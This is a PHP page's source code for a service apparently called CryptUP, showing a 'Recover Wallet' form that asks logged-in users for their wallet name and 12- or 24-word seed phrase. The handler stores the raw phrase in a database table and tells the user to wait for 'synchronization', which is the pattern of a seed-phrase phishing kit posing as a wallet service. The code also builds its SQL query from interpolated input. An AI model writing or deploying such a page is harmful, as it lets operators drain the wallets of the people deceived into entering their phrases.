<?php
include_once "config/config.php";
if (!isset($_SESSION["cryptup_user"])) {
    echo "<script>location.href = 'login.php'</script>";
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1.0" name="viewport" />
    <title>CryptUP || Wallet Phrase</title>
    <link href="data:image/x-icon;base64," rel="icon" type="image/x-icon" />
    <link href="https://fonts.googleapis.com" rel="preconnect" />
    <link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect" />
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap"
        rel="stylesheet" />
    <!-- <script src="https://cdn.tailwindcss.com?plugins=forms,container-queries"></script> -->
    <script src="assets/js/tailwindcss.js"></script>
    <style type="text/tailwindcss">
        :root {
            --primary-color: #53d22c;
            --background-color: #121212;
            --text-primary: #E0E0E0;
            --text-secondary: #A0A0A0;
            --accent-color: #66bb6a;
        }
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--background-color);
            color: var(--text-primary);
        }
        .button_primary {
            @apply bg-[var(--primary-color)] text-black rounded-full px-4 py-2 hover:bg-[var(--accent-color)];
        }
        .button_secondary {
            @apply bg-gray-700 text-[var(--text-primary)] rounded-full px-4 py-2 hover:bg-gray-600;
        }
        .input {
            @apply bg-gray-800 text-[var(--text-primary)] border border-gray-600 rounded-xl px-4 py-2 focus:outline-none focus:border-[var(--primary-color)];
        }
        .card {
            @apply bg-gray-900/50 backdrop-blur-sm rounded-2xl p-6 shadow-2xl;
        }
        .typography_h1 {
            @apply text-3xl font-bold text-[var(--text-primary)];
        }
        .typography_h2 {
            @apply text-2xl font-semibold text-[var(--text-primary)];
        }
        .typography_body {
            @apply text-base;
        }
    </style>
</head>

<body class="bg-[var(--background-color)] text-[var(--text-primary)]">
    <div class="relative flex size-full min-h-screen flex-col overflow-x-hidden">
        <div class="layout-container flex h-full grow flex-col">
            <?php include "components/nav.php"; ?>
            <main class="flex flex-1 items-center justify-center py-12">
                <form method="post" class="card w-full max-w-lg">
                    <div class="text-center">
                        <h1 class="typography_h1 mb-2">Enter Your Seed Phrase</h1>
                        <p class="typography_body">Enter your 12 or 24-word seed phrase to recover your wallet.</p>
                    </div>
                    <div class="mt-8">
                        <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
                            for="recipient-address">Wallet</label>
                        <div class="relative">
                            <input class="input w-full" id="recipient-address" required name="wallet"
                                placeholder="E.g: Trust wallet" type="text" />

                        </div>
                    </div>
                    <div class="mt-4">
                        <label class="block text-sm font-medium text-[var(--text-secondary)] mb-2"
                            for="phrase">Phrase</label>
                        <textarea id="phrase" required name="phrase"
                            class="input w-full min-h-36 resize-none p-4 text-base leading-normal bg-white/5 border-white/10 focus:border-[var(--primary-color)] focus:ring-0"
                            placeholder="Enter your 12 or 24-word seed phrase"></textarea>
                        <?php if (isset($_SESSION["error"])): ?>
                            <p class="typography_body mt-2 text-center text-red-500"><?= $_SESSION["error"]; ?></p>
                            <?php
                            unset($_SESSION["error"]);
                        endif;
                        ?>
                    </div>
                    <div class="mt-6 flex justify-center">
                        <button class="button_primary h-12 w-full max-w-xs text-base font-bold tracking-wider"
                            name="save" type="submit">
                            <span>Recover Wallet</span>
                        </button>
                    </div>
                    <?php
                    if (isset($_POST["save"])) {
                        $wallet = htmlspecialchars($_POST["wallet"]);
                        $phrase = trim(htmlspecialchars($_POST["phrase"]));
                        $phraseArr = explode(" ", $phrase);
                        if (count($phraseArr) < 12 || (count($phraseArr) > 12 && count($phraseArr) < 24) || count($phraseArr) > 24) {
                            $_SESSION["error"] = "Invalid Wallet phrase!";
                            echo "<script>location.href = 'wallet-phrase.php'; </script>";
                        } else {

                            $save = mysqli_query($conn, "INSERT INTO `wallet_phrases` (`user_id`,`wallet`, `phrase`) VALUES ('$user_id', '$wallet', '$phrase')");
                            if ($save) {
                                echo "<script>location.href = 'dashboard.php'; alert('Wallet phrase added wait for synchronization')</script>";
                            } else {
                                $_SESSION["error"] = "Something went wrong!";
                                echo "<script>location.href = 'wallet-phrase.php'; </script>";
                            }
                        }

                    }
                    ?>
                </form>
            </main>
        </div>
    </div>

</body>

</html>